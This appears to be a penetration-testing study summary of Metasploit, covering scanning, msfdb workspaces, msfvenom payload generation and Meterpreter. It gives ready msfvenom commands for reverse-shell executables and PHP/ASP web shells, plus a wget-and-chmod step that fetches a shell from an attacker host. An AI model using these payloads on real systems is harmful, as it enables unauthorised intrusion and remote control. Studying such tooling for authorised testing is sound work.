# Metasploit: Exploitation

This summary covers the use of the Metasploit Framework (MSF) for scanning, vulnerability assessment, and exploitation.

### 1. Framework Overview

Metasploit is a powerful tool used to identify and exploit vulnerabilities across various target systems. It consists of several modules:

- **Exploits**: Code used to take advantage of a vulnerability.
- **Payloads**: Code that runs on the target system after successful exploitation (e.g., shells, Meterpreter).
- **Auxiliary**: Modules for scanning, fuzzing, and sniffing.
- **Post**: Modules for post-exploitation tasks (gathering info, pivoting).

### 2. Basic Commands

- **Start Metasploit**: `msfconsole`.
- **Search/Show Modules**: `search <module_name>`, `show auxiliary`, or `show exploits`. (for example: `search portscan`, `search udp`, `show auxilary`, `show exploits`)
- **Select a Module**: `use <module_name>`.
- **Configure Module**: `show options` to see requirements; `set <option> <value>` to configure them.
- **Module Info**: `info` provides detailed descriptions and references for the selected module.

### 3. Exploitation Workflow

#### A. Port Scanning

Metasploit includes auxiliary modules to perform scans directly within the framework.

- **Key Options**: `CONCURRENCY`: number of simultaneous targets, `PORTS`: range of ports to scan, `RHOSTS`: remote or target host.
- **Example**: `use auxiliary/scanner/portscan/tcp`.
- **Note1:** ports 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000
- **Note2:** Nmap scans can be performed directly on msfconsole prompt `nmap -sS <target_ip>` or `nmap -sV <target_IP>`

#### B. Vulnerability Scanning

Once services are identified, use auxiliary modules to find specific vulnerabilities.

- **Example**: `use auxiliary/scanner/smb/smb_ms17_010` (checks for EternalBlue) or `use auxiliary/scanner/vnc/vnc_login`

#### C. Execution

After configuring the exploit and selecting a payload (`show payloads` and `set payload <name>`), execute the attack using: `exploit` or `run`.

Note that choosing a working payload could become a trial and error process due to environmental or OS restrictions such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn't available (eg. payload/python/shell_reverse_tcp).

### 4. MSF Database (msfdb)

Using a database allows you to track results across multiple targets during an engagement. This will allow you to create workspaces to isolate different projects.

- **Delete existing database**: `$ sudo -u postgres msfdb delete`
- **Start Posgresql**: `$ systemctl start postgresql`
- **Initialize**: `$ msfdb init` or `$ sudo -u postgres msfdb init`
- **DB Status**: `db_status`
- **Nmap to DB**: `db_nmap -sV -p- <target_IP>`
- **Import Data**: `db_import <file.xml>` (commonly used with Nmap results).
- **Workspaces**: `workspace`
- **Add Wokspace**: `workspace -a <workspace_name>`
- **Select Worspace**: `workspace <workspace_name>`
- **View Hosts/Services**: `hosts` and `services` commands.
- **Host IP address**: `host -R`: assign to remote host, `host -L`: assign to local host, `host -D`: delete all assignments

### 5. Payload Generation with msfvenom

`msfvenom` is used to create stand-alone payloads that can be uploaded or downloaded to a target system. The `msfvenom --list formats` will list supported output formats.

#### Common Templates:

- **Linux (.elf)**: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Port> -f elf > shell.elf`.
- **Windows (.exe)**: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Port> -f exe > shell.exe`.
- **Web Payloads**:
  - **PHP**: `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<Port> -f raw > shell.php`.
  - **PHP with encoders**: `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64`
  - **ASP**: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Port> -f asp > shell.asp`.
- **Python**: `msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<Port> -f raw > shell.py`.

You can download the rev_shell payload on the target machine by starting a server on attackers machine using `python3 -m http.server 9000` then on the target machine download the file using `wget http://ATTACKING_MACHINE_IP:9000/rev_shell.elf` before executing this file on the machine you need to give executable permission using `chmod +x rev_shell.elf`.

Once a session (reverse shell) is opened, you can background it using CTRL+Z or abort it using CTRL+C. Backgrounding a session will be useful when working on more than one target simultaneously or on the same target with a different exploit and/or shell.

### 6. Meterpreter

Meterpreter is an advanced, multi-function payload that runs in memory to avoid detection.

- **Key Feature**: It allows for easy post-exploitation tasks, such as file manipulation, credential harvesting, and pivoting into the target network.
- **Handler**: When using `msfvenom` reverse shells, you must use the `exploit/multi/handler` module on your attacking machine to catch the connection.
